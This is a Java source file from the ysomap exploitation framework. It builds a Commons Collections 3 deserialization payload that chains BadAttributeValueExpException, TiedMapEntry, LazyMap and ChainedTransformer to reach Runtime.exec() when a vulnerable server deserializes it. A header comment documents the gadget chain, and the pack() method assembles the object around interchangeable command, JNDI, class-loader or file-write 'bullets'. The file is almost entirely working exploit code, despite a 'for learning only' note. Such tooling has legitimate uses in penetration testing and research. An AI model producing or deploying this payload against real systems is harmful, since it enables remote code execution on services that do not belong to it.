package ysomap.payloads.java.commons.collection_v3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysomap.bullets.Bullet;
import ysomap.bullets.collections.TransformerBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
/*
仅供学习，实战不建议
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
@SuppressWarnings({"rawtypes"})
//@Payloads
@Deprecated
@Targets({Targets.JDK})
@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
@Require(bullets = {"TransformerBullet",
        "TransformerWithJNDIBullet",
        "TransformerWithSleepBullet",
        "TransformerWithURLClassLoaderBullet",
        "TransformerWithFileWriteBullet"}, param = false)
@Dependencies({"commons-collections:commons-collections:3.2.1, without security manager"})
public class CommonsCollections4 extends AbstractPayload<BadAttributeValueExpException> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof org.apache.commons.collections.Transformer[];
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TransformerBullet.newInstance(args);
    }

    @Override
    public BadAttributeValueExpException pack(Object obj) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        ReflectionHelper.setAccessible(valfield);
        valfield.set(val, entry);

        ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj);
        return val;
    }
}
